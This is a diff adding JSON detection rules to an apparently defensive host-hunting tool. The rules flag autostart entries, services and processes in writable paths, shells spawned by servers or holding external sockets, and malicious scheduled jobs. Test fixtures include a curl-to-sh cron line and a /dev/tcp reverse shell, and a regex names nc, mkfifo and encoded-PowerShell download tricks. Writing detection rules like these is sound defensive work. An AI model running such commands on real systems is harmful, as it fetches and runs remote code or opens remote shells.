+      "severity_reason": "Autostart locations are a common persistence mechanism, and temporary paths are a common place to stage programs.",
+      "confidence": "medium",
+      "confidence_reason": "The target path is directly observed; per-user installers also create such entries.",
+      "nature": "indicator",
+      "requires_coverage": [
+        "telemetry:persistence"
+      ],
+      "clauses": [
+        {
+          "id": "run",
+          "source": "telemetry",
+          "description": "An autostart entry with a user-writable target",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "persistence"
+              },
+              {
+                "field": "attrs.mechanism",
+                "op": "in",
+                "value": [
+                  "run_key",
+                  "startup_folder",
+                  "autostart",
+                  "profile_script",
+                  "rc_local"
+                ]
+              },
+              {
+                "field": "attrs.value",
+                "op": "regex",
+                "value": "(?i)(^|\\s|\\\")(/tmp/|/var/tmp/|/dev/shm/)|[a-z]:\\\\(users\\\\public|windows\\\\temp|programdata)\\\\|\\\\appdata\\\\local\\\\temp\\\\"
+              }
+            ]
+          }
+        }
+      ],
+      "join": {
+        "on": "record_id"
+      },
+      "title": "Autostart {run.attrs.mechanism} at {run.attrs.location} launches a program from a writable location",
+      "rationale": "Autostart entries make a program run at boot or logon. When the target sits in a temporary location, anyone who can write there can change what runs, and an attacker can use the same place for their own tooling.",
+      "false_positives": [
+        "Per-user applications that autostart from AppData."
+      ],
+      "confidence_boosters": [
+        "The entry was added recently.",
+        "The target is unsigned."
+      ],
+      "investigation": [
+        "Look up the entry's creator and creation time.",
+        "Hash and verify the target.",
+        "Check whether the user normally installs such software."
+      ],
+      "remediation": "If unauthorised, preserve the entry and target as evidence, then disable the entry per your incident process. This tool does not change the host.",
+      "references": {
+        "attack": [
+          {
+            "id": "T1547.001",
+            "relationship": "possible",
+            "explanation": "Run keys and startup items provide persistence; whether this entry is malicious is not established."
+          }
+        ],
+        "nist": [
+          "CM-7",
+          "SI-7",
+          "AU-6"
+        ]
+      },
+      "examples": [
+        {
+          "name": "run key in temp",
+          "expect": "match",
+          "platform": "windows",
+          "telemetry": {
+            "records": [
+              {
+                "category": "persistence",
+                "key": "p1",
+                "attributes": {
+                  "mechanism": "run_key",
+                  "location": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd",
+                  "value": "C:\\Users\\Public\\upd.exe"
+                }
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "rc.local with /tmp script",
+          "expect": "match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "persistence",
+                "key": "p1",
+                "attributes": {
+                  "mechanism": "rc_local",
+                  "location": "/etc/rc.local",
+                  "value": "/tmp/boot.sh &"
+                }
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "run key to program files",
+          "expect": "no_match",
+          "platform": "windows",
+          "telemetry": {
+            "records": [
+              {
+                "category": "persistence",
+                "key": "p1",
+                "attributes": {
+                  "mechanism": "run_key",
+                  "location": "HKLM\\...\\Run\\agent",
+                  "value": "C:\\Program Files\\Agent\\agent.exe"
+                }
+              }
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "DR-ANY-HPRC-001",
+      "version": "1.0.0",
+      "name": "Shell or script host started by a network-facing service",
+      "description": "A command shell or script host has a database, web or application server as its direct parent.",
+      "enabled": true,
+      "platforms": [
+        "any"
+      ],
+      "category": "hunt-process",
+      "severity": "high",
+      "severity_reason": "A server process that spawns a shell is a common outcome of command injection or a web shell; the shell can run with the server's privileges.",
+      "confidence": "medium",
+      "confidence_reason": "The parent/child relationship is observed directly, but administrators and some applications legitimately run helper shells from these services.",
+      "nature": "indicator",
+      "requires_coverage": [
+        "telemetry:process"
+      ],
+      "clauses": [
+        {
+          "id": "sh",
+          "source": "telemetry",
+          "description": "A shell or script host whose parent is a server process",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "process"
+              },
+              {
+                "field": "attrs.name",
+                "op": "in",
+                "value": [
+                  "sh",
+                  "bash",
+                  "dash",
+                  "zsh",
+                  "ksh",
+                  "csh",
+                  "tcsh",
+                  "fish",
+                  "cmd.exe",
+                  "powershell.exe",
+                  "pwsh.exe"
+                ]
+              },
+              {
+                "field": "process.parent_name",
+                "op": "in",
+                "value": [
+                  "nginx",
+                  "apache2",
+                  "httpd",
+                  "php-fpm",
+                  "php-fpm7",
+                  "php-fpm8",
+                  "tomcat",
+                  "mysqld",
+                  "mariadbd",
+                  "postgres",
+                  "redis-server",
+                  "w3wp.exe",
+                  "sqlservr.exe",
+                  "httpd.exe",
+                  "tomcat9.exe",
+                  "nginx.exe"
+                ]
+              }
+            ]
+          }
+        }
+      ],
+      "join": {
+        "on": "record_id"
+      },
+      "title": "{sh.attrs.name} started by {sh.process.parent_name} (pid {sh.attrs.pid})",
+      "rationale": "Server processes normally do not need an interactive shell. A shell as a direct child is a recognised pattern of remote command execution through a vulnerable or abused service, so it deserves a look, but scheduled jobs, deployment hooks and some CGI setups do the same.",
+      "false_positives": [
+        "A deployment or maintenance hook that deliberately runs a shell from the service.",
+        "CGI/PHP setups that call system()-style helpers with sh -c.",
+        "Database client tools launched by an administrator from within the service account."
+      ],
+      "confidence_boosters": [
+        "The shell's command line containing network tools or encoded payloads.",
+        "An established outbound connection owned by the shell (see DR-ANY-HPRC-004)."
+      ],
+      "investigation": [
+        "Read the command line of the shell and of its parent.",
+        "Review the server's access and error logs around the process start time.",
+        "Check the files the server can write for scripts that were not deployed by you.",
+        "Inspect what the shell has started or connected to (descendants and sockets)."
+      ],
+      "remediation": "Contain per your incident process (isolate the host if the activity is unexplained), then remove any unauthorised scripts and rotate credentials the service could read. This tool does not change the host.",
+      "references": {
+        "attack": [
+          {
+            "id": "T1505.003",
+            "relationship": "possible",
+            "explanation": "A shell spawned by a web service can be the result of a web shell; the data does not show how the process was started."
+          },
+          {
+            "id": "T1059",
+            "relationship": "possible",
+            "explanation": "A command interpreter is running; whether an adversary used it is not established."
+          }
+        ],
+        "nist": [
+          "SI-4",
+          "AU-6",
+          "CM-7"
+        ]
+      },
+      "examples": [
+        {
+          "name": "bash under nginx",
+          "expect": "match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "process",
+                "key": "pid:100",
+                "attributes": {
+                  "pid": 100,
+                  "ppid": 1,
+                  "name": "nginx",
+                  "exe": "/usr/bin/nginx",
+                  "user": "root",
+                  "cmdline": "nginx"
+                }
+              },
+              {
+                "category": "process",
+                "key": "pid:200",
+                "attributes": {
+                  "pid": 200,
+                  "ppid": 100,
+                  "name": "bash",
+                  "exe": "/usr/bin/bash",
+                  "user": "www-data",
+                  "cmdline": "bash -c id"
+                }
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "cmd under w3wp on windows",
+          "expect": "match",
+          "platform": "windows",
+          "telemetry": {
+            "records": [
+              {
+                "category": "process",
+                "key": "pid:100",
+                "attributes": {
+                  "pid": 100,
+                  "ppid": 4,
+                  "name": "w3wp.exe",
+                  "exe": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+                  "user": "root",
+                  "cmdline": "w3wp.exe"
+                }
+              },
+              {
+                "category": "process",
+                "key": "pid:200",
+                "attributes": {
+                  "pid": 200,
+                  "ppid": 100,
+                  "name": "cmd.exe",
+                  "exe": "C:\\Windows\\System32\\cmd.exe",
+                  "user": "root",
+                  "cmdline": "cmd.exe"
+                }
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "bash under sshd is a normal login",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "process",
+                "key": "pid:100",
+                "attributes": {
+                  "pid": 100,
+                  "ppid": 1,
+                  "name": "sshd",
+                  "exe": "/usr/bin/sshd",
+                  "user": "root",
+                  "cmdline": "sshd"
+                }
+              },
+              {
+                "category": "process",
+                "key": "pid:200",
+                "attributes": {
+                  "pid": 200,
+                  "ppid": 100,
+                  "name": "bash",
+                  "exe": "/usr/bin/bash",
+                  "user": "alice",
+                  "cmdline": "bash"
+                }
+              }
+            ]
+          }
+        },
+        {
+          "name": "nginx with no children",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "process",
+                "key": "pid:100",
+                "attributes": {
+                  "pid": 100,
+                  "ppid": 1,
+                  "name": "nginx",
+                  "exe": "/usr/bin/nginx",
+                  "user": "root",
+                  "cmdline": "nginx"
+                }
+              }
+            ]
+          }
+        },
+        {
+          "name": "process coverage unavailable",
+          "expect": "indeterminate",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "process",
+                "key": "pid:200",
+                "attributes": {
+                  "pid": 200,
+                  "ppid": 100,
+                  "name": "bash",
+                  "exe": "/usr/bin/bash",
+                  "user": "root",
+                  "cmdline": "bash"
+                }
+              }
+            ],
+            "coverage": {
+              "process": "unavailable"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "DR-ANY-HPRC-002",
+      "version": "1.0.0",
+      "name": "Process executing from a temporary or world-writable location",
+      "description": "A running process's executable path is under a temporary or commonly world-writable directory.",
+      "enabled": true,
+      "platforms": [
+        "any"
+      ],
+      "category": "hunt-process",
+      "severity": "medium",
+      "severity_reason": "Attackers favour directories any user can write to; legitimate software normally runs from package or program directories.",
+      "confidence": "medium",
+      "confidence_reason": "The path is directly observed, but installers, build tools and some portable software legitimately run from these locations.",
+      "nature": "indicator",
+      "requires_coverage": [
+        "telemetry:process"
+      ],
+      "clauses": [
+        {
+          "id": "p",
+          "source": "telemetry",
+          "description": "A process whose executable is in a temporary location",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "process"
+              },
+              {
+                "field": "attrs.exe",
+                "op": "regex",
+                "value": "(?i)^(/tmp/|/var/tmp/|/dev/shm/|/run/shm/)|\\\\(appdata\\\\local\\\\temp|windows\\\\temp|users\\\\public)\\\\"
+              }
+            ]
+          }
+        }
+      ],
+      "join": {
+        "on": "record_id"
+      },
+      "title": "{p.attrs.name} running from {p.attrs.exe}",
+      "rationale": "Executables in /tmp, /dev/shm or user temp directories are a staple of dropped tooling, and /dev/shm is not backed by disk, which also hampers later recovery. The location raises a question; it does not identify the program as malicious.",
+      "false_positives": [
+        "Package managers, installers and CI jobs running from temporary directories.",
+        "Portable applications run by users from a download or temp folder.",
+        "Self-extracting updaters."
+      ],
+      "confidence_boosters": [
+        "The file is deleted or has no matching package.",
+        "An established network connection owned by the process."
+      ],
+      "investigation": [
+        "Hash the executable and check it against your approved software list.",
+        "Find who created it and when (file times, package database, shell history).",
+        "Look at the process's parent, children and network connections.",
+        "If it is unexplained, preserve it (copy, then hash) before any containment."
+      ],
+      "remediation": "If unauthorised, preserve the file and memory as evidence first, then stop the process and remove persistence that references it. This tool does not change the host.",
+      "references": {
+        "attack": [
+          {
+            "id": "T1036.005",
+            "relationship": "possible",
+            "explanation": "Running from a temporary directory can accompany masquerading; the data does not show intent."
+          },
+          {
+            "id": "T1059",
+            "relationship": "possible",
+            "explanation": "A staged program is running; its purpose is unknown."
+          }
+        ],
+        "nist": [
+          "SI-4",
+          "CM-7",
+          "SI-7"
+        ]
+      },
+      "examples": [
+        {
+          "name": "process from /dev/shm",
+          "expect": "match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "process",
+                "key": "pid:300",
+                "attributes": {
+                  "pid": 300,
+                  "ppid": 1,
+                  "name": "kworker",
+                  "exe": "/dev/shm/.x/kworker",
+                  "user": "www-data",
+                  "cmdline": "kworker"
+                }
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "windows temp executable",
+          "expect": "match",
+          "platform": "windows",
+          "telemetry": {
+            "records": [
+              {
+                "category": "process",
+                "key": "pid:300",
+                "attributes": {
+                  "pid": 300,
+                  "ppid": 4,
+                  "name": "updater.exe",
+                  "exe": "C:\\Users\\bob\\AppData\\Local\\Temp\\updater.exe",
+                  "user": "root",
+                  "cmdline": "updater.exe"
+                }
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "normal system binary",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "process",
+                "key": "pid:300",
+                "attributes": {
+                  "pid": 300,
+                  "ppid": 1,
+                  "name": "sshd",
+                  "exe": "/usr/sbin/sshd",
+                  "user": "root",
+                  "cmdline": "sshd"
+                }
+              }
+            ]
+          }
+        },
+        {
+          "name": "executable unknown",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "process",
+                "key": "p1",
+                "attributes": {
+                  "pid": 5,
+                  "name": "x",
+                  "exe": null
+                },
+                "unknown_attributes": [
+                  "exe"
+                ]
+              }
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "DR-ANY-HPRC-004",
+      "version": "1.0.0",
+      "name": "Command shell with an established network connection",
+      "description": "A shell process owns an established TCP connection to a non-private address.",
+      "enabled": true,
+      "platforms": [
+        "any"
+      ],
+      "category": "hunt-process",
+      "severity": "high",
+      "severity_reason": "Interactive shells wired to a socket are the signature of reverse and bind shells.",
+      "confidence": "medium",
+      "confidence_reason": "Both facts are observed and linked by process id; shells run over SSH have a connection too, so the remote address and the process tree matter.",
+      "nature": "correlated",
+      "requires_coverage": [
+        "telemetry:process",
+        "telemetry:network_connection"
+      ],
+      "clauses": [
+        {
+          "id": "sh",
+          "source": "telemetry",
+          "description": "A shell process",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "process"
+              },
+              {
+                "field": "attrs.name",
+                "op": "in",
+                "value": [
+                  "sh",
+                  "bash",
+                  "dash",
+                  "zsh",
+                  "ksh",
+                  "csh",
+                  "tcsh",
+                  "fish",
+                  "cmd.exe",
+                  "powershell.exe",
+                  "pwsh.exe"
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "id": "net",
+          "source": "telemetry",
+          "description": "An established connection to a non-private address owned by the same process",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "network_connection"
+              },
+              {
+                "field": "attrs.state",
+                "op": "ieq",
+                "value": "established"
+              },
+              {
+                "field": "attrs.remote_address",
+                "op": "present"
+              },
+              {
+                "not": {
+                  "field": "attrs.remote_address",
+                  "op": "regex",
+                  "value": "^(10\\.|192\\.168\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|127\\.|169\\.254\\.|::1$|fe80:|f[cd][0-9a-f]{2}:|0\\.0\\.0\\.0$|::$)"
+                }
+              }
+            ]
+          }
+        }
+      ],
+      "join": {
+        "on": "attrs.pid"
+      },
+      "title": "{sh.attrs.name} (pid {sh.attrs.pid}) connected to {net.attrs.remote_address}:{net.attrs.remote_port}",
+      "rationale": "A shell that owns an external connection is how remote operators drive a host after a code-execution foothold. Two independent observations (process and socket) agree on the process id, which is stronger than either alone, but a shell started by an SSH daemon also owns a socket.",
+      "false_positives": [
+        "An administrator's shell on a jump host reaching an external address.",
+        "Remote-management agents that use a shell channel.",
+        "Pid reuse between the process and connection collection moments."
+      ],
+      "confidence_boosters": [
+        "The shell's parent is a service, interpreter or has no known parent.",
+        "The shell's command line contains /dev/tcp, nc, or socat."
+      ],
+      "investigation": [
+        "Establish the shell's parent chain: sshd means an interactive login, a service or interpreter means something else.",
+        "Identify the remote address (asset inventory, threat intelligence).",
+        "Compare with authentication events for the same period.",
+        "Capture the process's command line and open files before any change."
+      ],
+      "remediation": "If unauthorised, capture evidence, then isolate the host or block the remote address per your incident process. This tool does not change the host.",
+      "references": {
+        "attack": [
+          {
+            "id": "T1059.004",
+            "relationship": "possible",
+            "explanation": "A Unix shell with a remote channel can be command-and-control; this data shows a connection, not its content."
+          },
+          {
+            "id": "T1071",
+            "relationship": "possible",
+            "explanation": "An outbound connection exists; its purpose is unknown."
+          }
+        ],
+        "nist": [
+          "SI-4",
+          "SC-7",
+          "AU-6"
+        ]
+      },
+      "examples": [
+        {
+          "name": "shell with external socket",
+          "expect": "match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "process",
+                "key": "pid:50",
+                "attributes": {
+                  "pid": 50,
+                  "ppid": 1,
+                  "name": "bash",
+                  "exe": "/usr/bin/bash",
+                  "user": "www-data",
+                  "cmdline": "bash"
+                }
+              },
+              {
+                "category": "network_connection",
+                "key": "c:50:203.0.113.9:4444",
+                "attributes": {
+                  "protocol": "tcp",
+                  "state": "established",
+                  "local_address": "10.0.0.5",
+                  "local_port": 40050,
+                  "remote_address": "203.0.113.9",
+                  "remote_port": 4444,
+                  "pid": 50,
+                  "process": "bash"
+                }
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "shell with internal socket only",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "process",
+                "key": "pid:50",
+                "attributes": {
+                  "pid": 50,
+                  "ppid": 1,
+                  "name": "bash",
+                  "exe": "/usr/bin/bash",
+                  "user": "root",
+                  "cmdline": "bash"
+                }
+              },
+              {
+                "category": "network_connection",
+                "key": "c:50:10.0.0.9:4444",
+                "attributes": {
+                  "protocol": "tcp",
+                  "state": "established",
+                  "local_address": "10.0.0.5",
+                  "local_port": 40050,
+                  "remote_address": "10.0.0.9",
+                  "remote_port": 4444,
+                  "pid": 50,
+                  "process": "bash"
+                }
+              }
+            ]
+          }
+        },
+        {
+          "name": "external socket owned by another pid",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "process",
+                "key": "pid:50",
+                "attributes": {
+                  "pid": 50,
+                  "ppid": 1,
+                  "name": "bash",
+                  "exe": "/usr/bin/bash",
+                  "user": "root",
+                  "cmdline": "bash"
+                }
+              },
+              {
+                "category": "network_connection",
+                "key": "c:51:203.0.113.9:4444",
+                "attributes": {
+                  "protocol": "tcp",
+                  "state": "established",
+                  "local_address": "10.0.0.5",
+                  "local_port": 40051,
+                  "remote_address": "203.0.113.9",
+                  "remote_port": 4444,
+                  "pid": 51,
+                  "process": "curl"
+                }
+              }
+            ]
+          }
+        },
+        {
+          "name": "listening state is not a connection",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "process",
+                "key": "pid:50",
+                "attributes": {
+                  "pid": 50,
+                  "ppid": 1,
+                  "name": "bash",
+                  "exe": "/usr/bin/bash",
+                  "user": "root",
+                  "cmdline": "bash"
+                }
+              },
+              {
+                "category": "network_connection",
+                "key": "c:50:203.0.113.9:4444",
+                "attributes": {
+                  "protocol": "tcp",
+                  "state": "listen",
+                  "local_address": "10.0.0.5",
+                  "local_port": 40050,
+                  "remote_address": "203.0.113.9",
+                  "remote_port": 4444,
+                  "pid": 50,
+                  "process": "bash"
+                }
+              }
+            ]
+          }
+        },
+        {
+          "name": "network coverage unavailable",
+          "expect": "indeterminate",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "process",
+                "key": "pid:50",
+                "attributes": {
+                  "pid": 50,
+                  "ppid": 1,
+                  "name": "bash",
+                  "exe": "/usr/bin/bash",
+                  "user": "root",
+                  "cmdline": "bash"
+                }
+              }
+            ],
+            "coverage": {
+              "network_connection": "unavailable"
+            }
+          }
+        }
+      ],
+      "require": {
+        "all": [
+          "sh",
+          "net"
+        ]
+      }
+    },
+    {
+      "id": "DR-ANY-HSVC-001",
+      "version": "1.0.0",
+      "name": "Service whose program is in a user-writable or temporary location",
+      "description": "A service's executable or command line points into a temporary directory, a home directory or a user profile.",
+      "enabled": true,
+      "platforms": [
+        "any"
+      ],
+      "category": "hunt-persistence",
+      "severity": "medium",
+      "severity_reason": "Services run with high privileges and start automatically; a binary any user can replace is both an attack surface and a persistence location.",
+      "confidence": "medium",
+      "confidence_reason": "The path is directly observed; some software installs per-user services or runs from a user data directory.",
+      "nature": "indicator",
+      "requires_coverage": [
+        "telemetry:service"
+      ],
+      "clauses": [
+        {
+          "id": "svc",
+          "source": "telemetry",
+          "description": "A service whose command is in a user-writable location",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "service"
+              },
+              {
+                "field": "attrs.path",
+                "op": "regex",
+                "value": "(?i)^(/tmp/|/var/tmp/|/dev/shm/|/home/|/run/shm/)|^[a-z]:\\\\(users|temp|windows\\\\temp|programdata)\\\\"
+              }
+            ]
+          }
+        }
+      ],
+      "join": {
+        "on": "record_id"
+      },
+      "title": "Service {svc.attrs.name} runs {svc.attrs.path}",
+      "rationale": "Persistent privileged programs normally live in protected directories. A service pointing at a temp or user directory can be replaced by an unprivileged user, or may be the attacker's own installed program.",
+      "false_positives": [
+        "Developer or per-user services.",
+        "Applications installed under a user profile."
+      ],
+      "confidence_boosters": [
+        "Service created recently.",
+        "Runs as root or SYSTEM."
+      ],
+      "investigation": [
+        "Compare the service with the installed software list.",
+        "Check when the unit or service registration was created.",
+        "Hash the target and verify its signature or package.",
+        "Check the account the service runs as."
+      ],
+      "remediation": "If unauthorised, preserve the unit/registration and binary, then disable the service (not delete) per your incident process. This tool does not change the host.",
+      "references": {
+        "attack": [
+          {
+            "id": "T1543",
+            "relationship": "possible",
+            "explanation": "A service can provide persistence; whether this one is unauthorised is not established."
+          },
+          {
+            "id": "T1574.010",
+            "relationship": "possible",
+            "explanation": "A weak-permission service binary can be hijacked; the data does not test file permissions."
+          }
+        ],
+        "nist": [
+          "CM-7",
+          "CM-5",
+          "SI-7"
+        ]
+      },
+      "examples": [
+        {
+          "name": "linux service in /tmp",
+          "expect": "match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "service",
+                "key": "s1",
+                "attributes": {
+                  "name": "updater.service",
+                  "path": "/tmp/.u/updater",
+                  "state": "running"
+                }
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "windows service in user profile",
+          "expect": "match",
+          "platform": "windows",
+          "telemetry": {
+            "records": [
+              {
+                "category": "service",
+                "key": "s1",
+                "attributes": {
+                  "name": "Updater",
+                  "path": "C:\\Users\\bob\\AppData\\updater.exe"
+                }
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "system service",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "service",
+                "key": "s1",
+                "attributes": {
+                  "name": "ssh.service",
+                  "path": "/usr/sbin/sshd -D"
+                }
+              }
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "DR-ANY-HSVC-002",
+      "version": "1.0.0",
+      "name": "Service installed during the collection window and running from a user-writable path",
+      "description": "An install event for a service matches a service that points into a user-writable or temporary location.",
+      "enabled": true,
+      "platforms": [
+        "any"
+      ],
+      "category": "hunt-persistence",
+      "severity": "high",
+      "severity_reason": "A service created recently and placed where users can write is a strong persistence pattern.",
+      "confidence": "medium",
+      "confidence_reason": "The install event and the service record are separate observations joined by name.",
+      "nature": "correlated",
+      "requires_coverage": [
+        "telemetry:config_change",
+        "telemetry:service"
+      ],
+      "clauses": [
+        {
+          "id": "inst",
+          "source": "telemetry",
+          "description": "A service-install event",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "config_change"
+              },
+              {
+                "field": "attrs.object",
+                "op": "eq",
+                "value": "service"
+              },
+              {
+                "field": "attrs.change",
+                "op": "eq",
+                "value": "added"
+              }
+            ]
+          }
+        },
+        {
+          "id": "svc",
+          "source": "telemetry",
+          "description": "The service, pointing at a user-writable path",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "service"
+              },
+              {
+                "field": "attrs.path",
+                "op": "regex",
+                "value": "(?i)^(/tmp/|/var/tmp/|/dev/shm/|/home/|/run/shm/)|^[a-z]:\\\\(users|temp|windows\\\\temp|programdata)\\\\"
+              }
+            ]
+          }
+        }
+      ],
+      "join": {
+        "on": "attrs.name"
+      },
+      "title": "New service {inst.attrs.name} runs {svc.attrs.path}",
+      "rationale": "An installation event that coincides with a program in a writable location is what service-based persistence looks like. Two independent sources (the event log and the service inventory) agree on the service.",
+      "false_positives": [
+        "A legitimate installer that unpacks to a temp directory."
+      ],
+      "confidence_boosters": [
+        "Service runs as SYSTEM.",
+        "The binary is unsigned."
+      ],
+      "investigation": [
+        "Find the actor and logon session that installed the service.",
+        "Capture and hash the target binary.",
+        "Check what the service started and connected to."
+      ],
+      "remediation": "If unauthorised, preserve evidence then disable the service per your incident process. This tool does not change the host.",
+      "references": {
+        "attack": [
+          {
+            "id": "T1543.003",
+            "relationship": "possible",
+            "explanation": "A new Windows service can provide persistence; this one's purpose is not established."
+          },
+          {
+            "id": "T1543.002",
+            "relationship": "possible",
+            "explanation": "A new systemd service can provide persistence; this one's purpose is not established."
+          }
+        ],
+        "nist": [
+          "CM-5",
+          "CM-7",
+          "AU-6"
+        ]
+      },
+      "examples": [
+        {
+          "name": "installed and in temp",
+          "expect": "match",
+          "platform": "windows",
+          "telemetry": {
+            "records": [
+              {
+                "category": "config_change",
+                "key": "c1",
+                "attributes": {
+                  "object": "service",
+                  "change": "added",
+                  "name": "evil",
+                  "actor": "bob"
+                },
+                "event_time": "2026-03-01T09:00:00Z"
+              },
+              {
+                "category": "service",
+                "key": "s1",
+                "attributes": {
+                  "name": "evil",
+                  "path": "C:\\Users\\Public\\evil.exe"
+                }
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "installed in program files",
+          "expect": "no_match",
+          "platform": "windows",
+          "telemetry": {
+            "records": [
+              {
+                "category": "config_change",
+                "key": "c1",
+                "attributes": {
+                  "object": "service",
+                  "change": "added",
+                  "name": "agent"
+                },
+                "event_time": "2026-03-01T09:00:00Z"
+              },
+              {
+                "category": "service",
+                "key": "s1",
+                "attributes": {
+                  "name": "agent",
+                  "path": "C:\\Program Files\\Agent\\agent.exe"
+                }
+              }
+            ]
+          }
+        },
+        {
+          "name": "different service names",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "config_change",
+                "key": "c1",
+                "attributes": {
+                  "object": "service",
+                  "change": "added",
+                  "name": "a"
+                },
+                "event_time": "2026-03-01T09:00:00Z"
+              },
+              {
+                "category": "service",
+                "key": "s1",
+                "attributes": {
+                  "name": "b",
+                  "path": "/tmp/b"
+                }
+              }
+            ]
+          }
+        }
+      ],
+      "require": {
+        "all": [
+          "inst",
+          "svc"
+        ]
+      }
+    },
+    {
+      "id": "DR-ANY-HTSK-001",
+      "version": "1.0.0",
+      "name": "Scheduled task or cron entry with a download-and-execute or remote-shell pattern",
+      "description": "A scheduled job's command downloads and runs code, opens a network shell, or decodes an encoded payload.",
+      "enabled": true,
+      "platforms": [
+        "any"
+      ],
+      "category": "hunt-persistence",
+      "severity": "high",
+      "severity_reason": "Scheduled execution is a favoured persistence mechanism, and these command shapes are rarely part of routine jobs.",
+      "confidence": "medium",
+      "confidence_reason": "The pattern is matched on the command text; some maintenance scripts legitimately download and run files.",
+      "nature": "indicator",
+      "requires_coverage": [
+        "telemetry:scheduled_task"
+      ],
+      "clauses": [
+        {
+          "id": "job",
+          "source": "telemetry",
+          "description": "A scheduled job with a suspicious command pattern",
+          "where": {
+            "all": [
+              {
+                "field": "category",
+                "op": "eq",
+                "value": "scheduled_task"
+              },
+              {
+                "field": "attrs.command",
+                "op": "regex",
+                "value": "(?i)(curl|wget)[^|;]*\\|\\s*(ba)?sh|/dev/tcp/|\\bnc(at)?\\b[^|;]*\\s-e\\s|mkfifo|base64\\s+(-d|--decode)[^|;]*\\|\\s*(ba)?sh|powershell[^|;]*\\s-(e|enc|encodedcommand)\\s|bitsadmin[^|;]*/transfer|certutil[^|;]*-urlcache|mshta\\s+http|regsvr32[^|;]*/i:http"
+              }
+            ]
+          }
+        }
+      ],
+      "join": {
+        "on": "record_id"
+      },
+      "title": "Scheduled job {job.attrs.name} runs a suspicious command",
+      "rationale": "Jobs that pipe a download into a shell, open a /dev/tcp socket or run encoded PowerShell are the typical shapes of persistence and remote access. Real maintenance jobs can download and run scripts, so the source of the content matters.",
+      "false_positives": [
+        "Provisioning or update scripts that fetch and run a vendor installer.",
+        "Monitoring agents."
+      ],
+      "confidence_boosters": [
+        "The job's owner is root/SYSTEM.",
+        "The job was created recently."
+      ],
+      "investigation": [
+        "Read the full command and the file/registration it came from.",
+        "Establish who created the job and when.",
+        "Retrieve and examine any script it runs, without executing it.",
+        "Check what the job has started recently."
+      ],
+      "remediation": "If unauthorised, copy the job definition as evidence, then disable it (not delete) per your incident process. This tool does not change the host.",
+      "references": {
+        "attack": [
+          {
+            "id": "T1053",
+            "relationship": "possible",
+            "explanation": "Scheduled tasks provide persistence and execution; whether this one is malicious is not established."
+          },
+          {
+            "id": "T1059",
+            "relationship": "possible",
+            "explanation": "The command invokes an interpreter or network shell; intent is not established."
+          }
+        ],
+        "nist": [
+          "CM-7",
+          "SI-4",
+          "AU-6"
+        ]
+      },
+      "examples": [
+        {
+          "name": "curl piped to sh",
+          "expect": "match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "scheduled_task",
+                "key": "t1",
+                "attributes": {
+                  "name": "/etc/cron.d/x",
+                  "command": "*/5 * * * * root curl -s http://203.0.113.9/x.sh | sh",
+                  "user": "root"
+                },
+                "scope": "cron"
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "bash tcp redirect",
+          "expect": "match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
+                "category": "scheduled_task",
+                "key": "t1",
+                "attributes": {
+                  "name": "/etc/cron.d/y",
+                  "command": "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",
+                  "user": "root"
+                },
+                "scope": "cron"
+              }
+            ]
+          },
+          "count": 1
+        },
+        {
+          "name": "ordinary backup",
+          "expect": "no_match",
+          "platform": "linux",
+          "telemetry": {
+            "records": [
+              {
